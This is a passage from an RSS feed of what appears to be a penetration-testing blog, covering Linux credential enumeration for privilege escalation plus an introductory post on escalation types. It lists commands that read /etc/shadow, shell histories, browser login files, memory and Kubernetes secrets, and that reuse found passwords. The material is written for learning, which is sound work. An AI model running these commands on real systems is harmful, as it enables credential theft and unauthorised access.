+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -name &lt;span class="s2">&amp;#34;*.conf&amp;#34;&lt;/span> 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find / -name &lt;span class="s2">&amp;#34;*.yml&amp;#34;&lt;/span> 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find / -name &lt;span class="s2">&amp;#34;*.ini&amp;#34;&lt;/span> 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Look in directories like /etc/, /var/, /opt/, and /home/.
+Examples of Files to Check:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">/etc/passwd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/etc/shadow &lt;span class="o">(&lt;/span>requires root or elevated privileges&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/etc/ssh/sshd_config
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="2">
+&lt;li>Check History Files
+Users often type sensitive commands that get stored in shell history files.&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">cat ~/.bash_history
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat ~/.zsh_history
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Look for commands like ssh, sudo, mysql, or any with plaintext passwords.&lt;/p>
+&lt;ol start="3">
+&lt;li>Search for Files Containing the Word &amp;ldquo;Password&amp;rdquo;
+Look for plaintext credentials in files.&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">grep -ri &lt;span class="s2">&amp;#34;password&amp;#34;&lt;/span> / 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Include variations like &amp;ldquo;passwd,&amp;rdquo; &amp;ldquo;pass,&amp;rdquo; or &amp;ldquo;pwd.&amp;rdquo;&lt;/p>
+&lt;ol start="4">
+&lt;li>Search for SSH Keys
+SSH private keys can be used to log into other systems.&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -name &lt;span class="s2">&amp;#34;id_rsa&amp;#34;&lt;/span> 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Check default paths like ~/.ssh/.&lt;/p>
+&lt;ol start="5">
+&lt;li>Look for Database Credentials
+Applications often store database credentials in config files.&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">grep -ri &lt;span class="s2">&amp;#34;DB_USER&amp;#34;&lt;/span> / 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">grep -ri &lt;span class="s2">&amp;#34;DB_PASS&amp;#34;&lt;/span> / 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Files to check:
+wp-config.php (WordPress)
+.env (Laravel or modern apps)
+settings.py (Django)&lt;/p>
+&lt;ol start="6">
+&lt;li>Dump Memory for Passwords
+Sometimes passwords can be found in running memory.&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">strings /dev/mem &lt;span class="p">|&lt;/span> grep -i &lt;span class="s2">&amp;#34;password&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Alternatively, check running processes:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl"> ps aux &lt;span class="p">|&lt;/span>grep -i &lt;span class="s2">&amp;#34;password&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="7">
+&lt;li>Check for Backup Files
+Old backups may contain sensitive data.&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -name &lt;span class="s2">&amp;#34;*.bak&amp;#34;&lt;/span> 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find / -name &lt;span class="s2">&amp;#34;*.old&amp;#34;&lt;/span> 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find / -name &lt;span class="s2">&amp;#34;*.backup&amp;#34;&lt;/span> 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="8">
+&lt;li>Identify Open Connections for Exposed Credentials
+Applications exposing credentials via environment variables or arguments can be a goldmine.&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">env &lt;span class="p">|&lt;/span> grep -i &lt;span class="s2">&amp;#34;pass&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Check processes:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">ps aux &lt;span class="p">|&lt;/span> grep -E &lt;span class="s2">&amp;#34;password|username|key&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="9">
+&lt;li>Look for Git or Repository Secrets
+Repositories often accidentally include credentials.&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">find / -name &lt;span class="s2">&amp;#34;.git&amp;#34;&lt;/span> 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">grep -r &lt;span class="s2">&amp;#34;password&amp;#34;&lt;/span> .git 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="10">
+&lt;li>Dump Browser Credentials
+Browsers often save login information.&lt;/li>
+&lt;/ol>
+&lt;p>Firefox:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">cat ~/.mozilla/firefox/*.default-release/logins.json
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Chrome: Credentials are stored in `~/.config/google-chrome/Default/Login Data (encrypted).&lt;/p>
+&lt;ol start="11">
+&lt;li>Enumerate Credentials in Docker or Kubernetes&lt;/li>
+&lt;/ol>
+&lt;p>Docker:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">docker inspect &amp;lt;container_id&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Kubernetes:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">kubectl get secrets
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="12">
+&lt;li>Extract Passwords from Files Using Tools
+Tools like strings, binwalk, or exiftool can help extract data from binary files.&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">strings &amp;lt;file&amp;gt; &lt;span class="p">|&lt;/span> grep -i &lt;span class="s2">&amp;#34;password&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="13">
+&lt;li>Enumerate Web Credentials
+Search web server files for hardcoded credentials:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">grep -ri &lt;span class="s2">&amp;#34;auth&amp;#34;&lt;/span> /var/www/html/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="14">
+&lt;li>Advanced: Check for Password Reuse
+If you find a password or hash, try it across other accounts/services.&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">su -c &lt;span class="s2">&amp;#34;&amp;lt;found_password&amp;gt;&amp;#34;&lt;/span> &amp;lt;username&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="automation-tools">Automation tools
+&lt;/h2>&lt;p>&lt;strong>Automation tools help streamline the process of enumeration, vulnerability discovery, and privilege escalation by automating repetitive tasks and identifying potential weaknesses efficiently. In my opinion, mastering the process manually is preferable.&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>&lt;strong>LinPEAS&lt;/strong>&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>LinPEAS&lt;/strong> (Linux Privilege Escalation Awesome Script) is a powerful script designed to enumerate a Linux system for privilege escalation vectors and misconfigurations.&lt;/p>
+&lt;p>• Download Source: LinPEAS GitHub Repository &lt;a class="link" href="https://github.com/peass-ng/PEASS-ng" target="_blank" rel="noopener"
+>LinPeas&lt;/a>&lt;/p>
+&lt;ol start="2">
+&lt;li>&lt;strong>Linux Exploit Suggester&lt;/strong>&lt;/li>
+&lt;/ol>
+&lt;p>This tool identifies potential privilege escalation vulnerabilities based on the system’s kernel version and configuration.&lt;/p>
+&lt;p>• Download Source: &lt;strong>Linux Exploit Suggester&lt;/strong> GitHub Repository &lt;a class="link" href="https://github.com/The-Z-Labs/linux-exploit-suggester" target="_blank" rel="noopener"
+>Linux Exploit Suggester&lt;/a>&lt;/p>
+&lt;ol start="3">
+&lt;li>&lt;strong>LinEnum&lt;/strong>&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>LinEnum&lt;/strong> is a lightweight script that performs comprehensive enumeration of a Linux system, including user details, file permissions, and potential privilege escalation paths.&lt;/p>
+&lt;p>• Download Source: LinEnum GitHub Repository &lt;a class="link" href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener"
+>LinEnum&lt;/a>&lt;/p>
+&lt;ol start="4">
+&lt;li>&lt;strong>Pspy&lt;/strong>&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Pspy&lt;/strong> is a process monitoring tool that allows you to watch processes executed on a Linux system without needing elevated privileges.&lt;/p>
+&lt;p>• Download Source: pspy GitHub Repository &lt;a class="link" href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener"
+>Pspy&lt;/a>&lt;/p>
+&lt;p>&lt;strong>Conclusion&lt;/strong>
+In this article, I’ve shared key aspects of enumeration to help us master privilege escalation, from system and user insights to files, networks, and passwords. While tools can assist, I believe manual expertise is crucial. Thanks for reading, and happy learning!&lt;/p></description></item><item><title>Privilege Escalation</title><link>https://zerodex1.github.io/p/privilege-escalation/</link><pubDate>Mon, 20 Jan 2025 21:11:19 +0000</pubDate><guid>https://zerodex1.github.io/p/privilege-escalation/</guid><description>&lt;img src="https://zerodex1.github.io/p/privilege-escalation/cover.jpg" alt="Featured image of post Privilege Escalation" />&lt;h1 id="privilege-escalation">Privilege escalation
+&lt;/h1>&lt;p>1-What&amp;rsquo;s Privilege escalation?&lt;/p>
+&lt;p>2-Types of Privilege escalation.&lt;/p>
+&lt;h2 id="whats-privilege-escalation-">What&amp;rsquo;s Privilege escalation :
+&lt;/h2>&lt;p>● &lt;strong>Privilege escalation&lt;/strong> is a critical concept in penetration testing and red
+teaming.&lt;/p>
+&lt;p>● It refers to the process of gaining elevated access or additional privileges
+in a computer system or network, typically from a lower-level user to a
+higher-level user or administrator.&lt;/p>
+&lt;p>● &lt;strong>Privilege escalation&lt;/strong> involves exploiting vulnerabilities or
+misconfigurations to gain access to resources that are typically restricted
+to users with higher privileges.&lt;/p>
+&lt;h2 id="types-of-privilege-escalation-">Types of Privilege escalation :
+&lt;/h2>&lt;p>&lt;strong>Privilege escalation&lt;/strong> can be divided in two types: &lt;strong>vertical&lt;/strong> and &lt;strong>horizontal&lt;/strong>.&lt;/p>
+&lt;p>● &lt;strong>Vertical&lt;/strong>: the attacker is able to move from a lower privileged user to a
+higher privileged user. For example from a low-end user to administrator
+or root user.&lt;/p>
+&lt;p>● &lt;strong>Horizontal&lt;/strong>: the attacker keeps the same set or level of privileges, but
+assumes the identity of a different user (he/she does not gain any further
+privilege).&lt;/p>
+&lt;h2 id="table-of-contents-">Table of contents :
+&lt;/h2>&lt;ul>
+&lt;li>Enumeration
+&lt;ul>
+&lt;li>System and User Enum&lt;/li>
+&lt;li>Files Enum&lt;/li>
+&lt;li>Network Enum&lt;/li>
+&lt;li>Password Enum&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Techniques&lt;/li>
+&lt;li>Kernel Exploit&lt;/li>
+&lt;li>Sudo Attacks
+&lt;ul>
+&lt;li>CVE-2019-14287&lt;/li>
+&lt;li>CVE-2019-18634&lt;/li>
+&lt;li>Shell Escaping&lt;/li>
+&lt;li>LD-PRELOAD&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>SUID
+&lt;ul>
+&lt;li>SUID Attacks&lt;/li>
+&lt;li>Shared Object Injection&lt;/li>
+&lt;li>Binary Symlinks&lt;/li>
+&lt;li>Environment variables&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Scheduled Tasks
+&lt;ul>
+&lt;li>Scheduled Tasks&lt;/li>
+&lt;li>Cron Jobs&lt;/li>
+&lt;li>Cron wildcards&lt;/li>
+&lt;li>Cron file overwrites&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Capabilities Attacks&lt;/li>
+&lt;li>NFS Attack&lt;/li>
+&lt;/ul></description></item></channel></rss>
